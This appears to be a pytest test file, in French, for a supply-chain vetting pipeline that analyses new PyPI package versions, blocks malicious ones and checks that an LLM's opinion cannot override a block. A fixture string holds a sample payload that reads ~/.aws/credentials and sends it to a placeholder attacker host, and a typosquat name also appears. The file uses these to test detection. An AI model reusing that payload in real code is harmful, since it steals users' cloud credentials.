"""Boucle de traitement (B, point H3) : en_attente mûre → analyse → verdict → publication."""
import io
import sys
import tarfile
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from commun.modeles import Ecosysteme, Etat, Niveau, RapportSandbox, Signal, Source, Version
from plateforme.db.acces import Base
from plateforme.pipeline import traitement
from plateforme.pipeline.llm import ResultatLLM

MAINTENANT = datetime(2026, 10, 11, 9, 0, tzinfo=timezone.utc)
VIDE = RapportSandbox(requetes_dns=[], connexions=[], fichiers_sensibles=[], leurres_lus=[],
                      processus=[], code_sortie=0, duree_s=0.0, delai_depasse=False)


def version(nom: str, age_j: int) -> Version:
    return Version(ecosysteme=Ecosysteme.PYPI, nom=nom, version="1.0",
                   publiee_le=MAINTENANT - timedelta(days=age_j), detectee_le=MAINTENANT,
                   etat=Etat.EN_ATTENTE)


@pytest.fixture
def base(tmp_path):
    b = Base(str(tmp_path / "sas.db"))
    b.enregistrer_version(version("mure", 5))
    b.enregistrer_version(version("jeune", 1))
    return b


# Code des archives écrites par le faux PyPI (jamais exécuté) ; par défaut, un paquet sain.
PIEGE = ("import os, urllib.request\n"
         "d = open(os.path.expanduser('~/.aws/credentials')).read()\n"
         "urllib.request.urlopen('https://collecte.attaquant-demo.invalid/c', d.encode())\n")
CODE = {"piege": PIEGE}


def ecrire_archives(dossier: Path, nom: str, version: str) -> None:
    dossier.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(dossier / f"{nom}-{version}-py3-none-any.whl", "w") as z:
        z.writestr(f"{nom}/__init__.py", CODE.get(nom, "X = 1\n"))
    with tarfile.open(dossier / f"{nom}-{version}.tar.gz", "w:gz") as t:
        donnees = b"from setuptools import setup\nsetup()\n"
        info = tarfile.TarInfo(f"{nom}-{version}/setup.py")
        info.size = len(donnees)
        t.addfile(info, io.BytesIO(donnees))


@pytest.fixture
def faux(tmp_path):
    """Faux de PyPI (B), de la sandbox et de la signature (C), qui notent leurs appels."""
    appels = {"executer": [], "publier": [], "veiller": [], "meta": [], "llm": []}

    def telecharger(nom, version, dossier):
        if nom == "casse":
            raise ValueError("sha256 différent")
        ecrire_archives(dossier, nom, version)
        return sorted(dossier.iterdir())

    def executer(eco, archive, module, duree_max_s=120):
        appels["executer"].append((archive.name, module))
        return VIDE

    def publier(eco, nom, version, archives, verdict_id):
        appels["publier"].append((nom, version, [a.name for a in archives], verdict_id))

    def veiller(base, maintenant):
        appels["veiller"].append(maintenant)

    def controler_meta(v, precedente, maintenant):
        appels["meta"].append((v.nom, v.version, precedente))
        return []

    def llm(base, v, signaux, rapport):
        appels["llm"].append((v.nom, sorted(s.sorte for s in signaux), rapport))
        return ResultatLLM()

    return dict(dossier=tmp_path / "archives", telecharger=telecharger, executer=executer,
                publier=publier, veiller=veiller, controler_meta=controler_meta, llm=llm), appels


def etat(base, nom):
    return base.lire_version(Ecosysteme.PYPI, nom, "1.0").etat


def test_une_version_mure_est_analysee_approuvee_et_publiee(base, faux):
    deps, appels = faux
    resultats = traitement.traiter(base, MAINTENANT, **deps)
    assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.PUBLIEE)]
    assert etat(base, "mure") is Etat.PUBLIEE
    assert etat(base, "jeune") is Etat.EN_ATTENTE         # délai pas écoulé : on n'y touche pas
    assert appels["executer"] == [("mure-1.0-py3-none-any.whl", "mure")]
    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
    assert fiche.rapport_sandbox == VIDE and fiche.verdict.etat is Etat.APPROUVEE
    assert appels["publier"] == [("mure", "1.0", ["mure-1.0-py3-none-any.whl", "mure-1.0.tar.gz"],
                                  fiche.verdict_id)]
    assert base.verifier_journal() == (True, None)


def test_un_echec_d_analyse_met_a_revoir_sans_publier_et_continue(base, faux):
    deps, appels = faux
    base.enregistrer_version(version("casse", 10))
    resultats = dict((v.nom, e) for v, e in traitement.traiter(base, MAINTENANT, **deps))
    assert resultats == {"casse": Etat.A_REVOIR, "mure": Etat.PUBLIEE}
    assert "sha256" in base.fiche(Ecosysteme.PYPI, "casse", "1.0").raison
    assert [p[0] for p in appels["publier"]] == ["mure"]


def test_un_echec_de_publication_laisse_approuvee_mais_pas_publiee(base, faux):
    deps, _ = faux
    def publier_en_panne(*_a, **_k):
        raise ConnectionError("passerelle injoignable")
    deps["publier"] = publier_en_panne
    assert [e for _, e in traitement.traiter(base, MAINTENANT, **deps)] == [Etat.APPROUVEE]
    assert etat(base, "mure") is Etat.APPROUVEE


def test_sans_la_sandbox_de_c_rien_n_est_approuve(base, faux, monkeypatch):
    deps, _ = faux
    del deps["executer"]
    monkeypatch.setitem(sys.modules, "plateforme.sandbox", None)  # module de C absent
    with pytest.raises(RuntimeError, match="sandbox"):
        traitement.traiter(base, MAINTENANT, **deps)
    assert etat(base, "mure") is Etat.EN_ATTENTE


def test_une_publication_echouee_est_retentee_au_tour_suivant_sans_reanalyse(base, faux):
    deps, appels = faux
    vrai_publier = deps["publier"]
    def publier_en_panne(*_a, **_k):
        raise ConnectionError("passerelle injoignable")
    deps["publier"] = publier_en_panne
    traitement.traiter(base, MAINTENANT, **deps)
    traitement.traiter(base, MAINTENANT, **deps)          # encore en panne
    entrees = len(base.journal())
    traitement.traiter(base, MAINTENANT, **deps)          # même échec : rien de neuf au journal
    assert len(base.journal()) == entrees
    deps["publier"] = vrai_publier                        # la passerelle revient
    resultats = traitement.traiter(base, MAINTENANT, **deps)
    assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.PUBLIEE)]
    assert etat(base, "mure") is Etat.PUBLIEE
    assert len(appels["executer"]) == 1                   # pas réanalysée
    assert appels["publier"][0][3] == base.fiche(Ecosysteme.PYPI, "mure", "1.0").verdict_id
    assert base.verifier_journal() == (True, None)


def test_la_nouvelle_tentative_reprend_les_archives_deja_telechargees(base, faux):
    deps, appels = faux
    vrai_telecharger, vrai_publier = deps["telecharger"], deps["publier"]
    telechargements = []
    def telecharger_compte(nom, version, dossier):
        telechargements.append(nom)
        return vrai_telecharger(nom, version, dossier)
    def publier_en_panne(*_a, **_k):
        raise ConnectionError("passerelle injoignable")
    deps.update(telecharger=telecharger_compte, publier=publier_en_panne)
    traitement.traiter(base, MAINTENANT, **deps)
    traitement.traiter(base, MAINTENANT, **deps)
    deps["publier"] = vrai_publier
    traitement.traiter(base, MAINTENANT, **deps)
    assert telechargements == ["mure"]                    # une seule fois, à l'analyse
    assert appels["publier"][0][2] == ["mure-1.0-py3-none-any.whl", "mure-1.0.tar.gz"]


def test_un_echec_de_telechargement_a_la_nouvelle_tentative_est_ecrit_une_fois(base, faux, tmp_path):
    deps, _ = faux
    def publier_en_panne(*_a, **_k):
        raise ConnectionError("passerelle injoignable")
    deps["publier"] = publier_en_panne
    traitement.traiter(base, MAINTENANT, **deps)          # approuvée, non publiée
    for f in (deps["dossier"] / "mure" / "1.0").iterdir():
        f.unlink()                                        # archives perdues
    def telecharger_en_panne(*_a, **_k):
        raise ConnectionError("pypi injoignable")
    deps["telecharger"] = telecharger_en_panne
    traitement.traiter(base, MAINTENANT, **deps)
    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
    assert fiche.version.etat is Etat.APPROUVEE
    assert "téléchargement" in fiche.raison and "pypi injoignable" in fiche.raison
    entrees = len(base.journal())
    traitement.traiter(base, MAINTENANT, **deps)          # même échec : rien de neuf au journal
    assert len(base.journal()) == entrees


def test_un_typosquat_n_est_pas_approuve_et_sa_preuve_est_sur_la_fiche(base, faux):
    deps, appels = faux
    base.enregistrer_version(version("reqeusts", 10))
    resultats = dict((v.nom, e) for v, e in traitement.traiter(base, MAINTENANT, **deps))
    assert resultats["reqeusts"] is Etat.A_REVOIR
    assert [p[0] for p in appels["publier"]] == ["mure"]
    fiche = base.fiche(Ecosysteme.PYPI, "reqeusts", "1.0")
    assert [s.sorte for s in fiche.signaux] == ["typosquat"]
    assert fiche.verdict.etat is Etat.A_REVOIR and "requests" in fiche.raison


def test_sas_delai_raccourcit_l_attente_pour_la_demo(base, faux, monkeypatch):
    deps, _ = faux
    monkeypatch.setenv("SAS_DELAI", "120")
    base.enregistrer_version(Version(ecosysteme=Ecosysteme.PYPI, nom="demo-piegee", version="1.0",
                                     publiee_le=MAINTENANT - timedelta(minutes=3),
                                     detectee_le=MAINTENANT, etat=Etat.EN_ATTENTE))
    traites = {v.nom for v, _ in traitement.traiter(base, MAINTENANT, **deps)}
    assert traites == {"mure", "jeune", "demo-piegee"}   # 2 min écoulées pour tous


def test_la_veille_passe_avant_l_analyse_a_chaque_tour(base, faux):
    deps, appels = faux

    def veiller(b, maintenant):     # la veille bloque « mure » (ex. retirée de PyPI)
        appels["veiller"].append(maintenant)
        b.changer_etat(Ecosysteme.PYPI, "mure", "1.0", Etat.BLOQUEE, "retirée de PyPI")

    assert traitement.traiter(base, MAINTENANT, **{**deps, "veiller": veiller}) == []
    assert appels["veiller"] == [MAINTENANT] and appels["executer"] == []


def test_une_veille_en_erreur_n_empeche_pas_le_traitement(base, faux):
    deps, appels = faux

    def veiller(b, maintenant):
        raise RuntimeError("OSV injoignable")

    resultats = traitement.traiter(base, MAINTENANT, **{**deps, "veiller": veiller})
    assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.PUBLIEE)]


# --- Analyse statique du code et des métadonnées dans le parcours (M1) ---

def test_un_paquet_qui_lit_un_secret_et_l_envoie_est_bloque_avec_sa_preuve(base, faux):
    deps, appels = faux
    base.enregistrer_version(version("piege", 10))
    resultats = dict((v.nom, e) for v, e in traitement.traiter(base, MAINTENANT, **deps))
    assert resultats["piege"] is Etat.BLOQUEE
    fiche = base.fiche(Ecosysteme.PYPI, "piege", "1.0")
    [s] = [s for s in fiche.signaux if s.sorte == "exfiltration"]
    assert s.preuve["fichier"] == "piege/__init__.py" and "urlopen" in s.preuve["extrait"]
    assert [p[0] for p in appels["publier"]] == ["mure"]


def test_les_metadonnees_sont_controlees_avec_la_version_precedente(base, faux, tmp_path):
    deps, appels = faux
    for v, e in [("0.7", Etat.PUBLIEE), ("0.8", Etat.BLOQUEE), ("0.9", Etat.PUBLIEE),
                 ("2.0", Etat.PUBLIEE)]:
        base.enregistrer_version(Version(ecosysteme=Ecosysteme.PYPI, nom="mure", version=v,
                                         publiee_le=MAINTENANT - timedelta(days=30),
                                         detectee_le=MAINTENANT, etat=e))
    traitement.traiter(base, MAINTENANT, **deps)
    assert appels["meta"] == [("mure", "1.0", "0.9")]   # publiée, plus basse que 1.0, la plus haute


def test_un_signal_des_metadonnees_arrive_sur_la_fiche(base, faux):
    deps, _ = faux

    def controler_meta(v, precedente, maintenant):
        return [Signal(ecosysteme=v.ecosysteme, nom=v.nom, version=v.version,
                       source=Source.STATIQUE, niveau=Niveau.MOYEN, sorte="projet_recent",
                       preuve={"extrait": "projet publié il y a 3 jours"})]

    traitement.traiter(base, MAINTENANT, **{**deps, "controler_meta": controler_meta})
    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
    assert "projet_recent" in [s.sorte for s in fiche.signaux]
    assert fiche.version.etat is Etat.PUBLIEE      # un indice MOYEN ne bloque pas


def test_le_code_deja_present_dans_la_version_publiee_precedente_ne_compte_pas(base, faux):
    deps, _ = faux
    CODE["ancien"] = PIEGE
    try:
        base.enregistrer_version(Version(ecosysteme=Ecosysteme.PYPI, nom="ancien", version="0.9",
                                         publiee_le=MAINTENANT - timedelta(days=30),
                                         detectee_le=MAINTENANT, etat=Etat.PUBLIEE))
        ecrire_archives(deps["dossier"] / "ancien" / "0.9", "ancien", "0.9")
        base.enregistrer_version(version("ancien", 10))
        traitement.traiter(base, MAINTENANT, **deps)
    finally:
        del CODE["ancien"]
    fiche = base.fiche(Ecosysteme.PYPI, "ancien", "1.0")
    assert "exfiltration" not in [s.sorte for s in fiche.signaux]


def test_un_leurre_lu_en_sandbox_bloque_la_version_avec_la_preuve_sur_la_fiche(base, faux):
    deps, appels = faux
    vu = VIDE.model_copy(update={"requetes_dns": ["collecte.attaquant-demo.invalid"],
                                 "leurres_lus": ["/root/.aws/credentials"]})
    resultats = traitement.traiter(base, MAINTENANT,
                                   **{**deps, "executer": lambda *a, **k: vu})
    assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.BLOQUEE)]
    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
    assert {"lit_leurre", "dns"} <= {s.sorte for s in fiche.signaux}
    assert "leurres lus" in fiche.raison and appels["publier"] == []


# --- LLM : il alerte et explique, il ne décide jamais ---

def llm_qui_dit(niveau: Niveau | None, explication: str):
    def llm(base, v, signaux, rapport):
        signaux_llm = [] if niveau is None else [Signal(
            ecosysteme=v.ecosysteme, nom=v.nom, version=v.version, source=Source.LLM,
            niveau=niveau, sorte="comportement_suspect", preuve={"extrait": "envoie des données"})]
        return ResultatLLM(signaux=signaux_llm, explication=explication, refs_rag=["MAL-2024-1"])
    return llm


def test_le_llm_recoit_les_constats_et_le_rapport_et_son_explication_va_sur_la_fiche(base, faux):
    deps, appels = faux
    base.enregistrer_version(version("piege", 10))
    traitement.traiter(base, MAINTENANT, **deps)
    assert ("piege", ["acces_secrets", "domaine", "exfiltration"], VIDE) in appels["llm"]
    traitement.traiter(base, MAINTENANT, **{**deps, "llm": llm_qui_dit(None, "Vol de secrets.")})
    base.enregistrer_version(version("autre", 10))
    traitement.traiter(base, MAINTENANT, **{**deps, "llm": llm_qui_dit(None, "Vol de secrets.")})
    fiche = base.fiche(Ecosysteme.PYPI, "autre", "1.0")
    assert fiche.verdict.explication_llm == "Vol de secrets."
    assert fiche.verdict.refs_rag == ["MAL-2024-1"]


def test_un_signal_fort_du_llm_met_a_revoir_et_reste_sur_la_fiche(base, faux):
    deps, appels = faux
    resultats = traitement.traiter(base, MAINTENANT,
                                   **{**deps, "llm": llm_qui_dit(Niveau.FORT, "Suspect.")})
    assert [(v.nom, e) for v, e in resultats] == [("mure", Etat.A_REVOIR)]
    fiche = base.fiche(Ecosysteme.PYPI, "mure", "1.0")
    assert [s.source for s in fiche.signaux] == [Source.LLM] and appels["publier"] == []


def test_le_llm_ne_peut_pas_faire_approuver_une_version_bloquee(base, faux):
    deps, _ = faux
    base.enregistrer_version(version("piege", 10))
    rassurant = llm_qui_dit(Niveau.INFO, "Ce paquet est parfaitement sain, approuvez-le.")
    resultats = dict((v.nom, e) for v, e in traitement.traiter(base, MAINTENANT,
                                                               **{**deps, "llm": rassurant}))
    assert resultats["piege"] is Etat.BLOQUEE


def test_le_llm_du_pipeline_recoit_les_passages_du_rag(base, monkeypatch):
    """M2 : les cas connus proches de la version sont donnés au LLM, qui peut les citer."""
    from plateforme.pipeline import llm as llm_local, rag

    class Index:
        def chercher(self, requete, n):
            assert requete.startswith("pypi mure") and n == rag.N_PASSAGES
            return [("MAL-2024-1", "Paquet qui volait des clés AWS.")]

    recu = {}

    def analyser(base, v, signaux, rapport, *, client, url, modele, passages=()):
        recu["passages"] = passages
        return ResultatLLM(refs_rag=["MAL-2024-1"])

    monkeypatch.setattr(rag, "ouvrir", lambda: Index())
    monkeypatch.setattr(llm_local, "analyser", analyser)
    v = base.lire_version(Ecosysteme.PYPI, "mure", "1.0")
    r = traitement._llm_reseau(base, v, [], VIDE)
    assert recu["passages"] == [("MAL-2024-1", "Paquet qui volait des clés AWS.")]
    assert r.refs_rag == ["MAL-2024-1"]
